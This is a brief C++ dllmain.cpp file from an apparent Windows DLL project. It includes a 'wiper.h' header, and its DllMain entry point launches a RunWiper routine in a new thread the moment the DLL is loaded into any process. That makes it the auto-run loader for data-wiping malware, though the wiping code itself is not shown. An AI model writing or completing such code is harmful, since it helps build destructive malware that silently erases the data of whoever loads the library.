// template keeping

// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "wiper.h"

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunWiper, NULL, 0, NULL);
        break;
    }
    return TRUE;
}
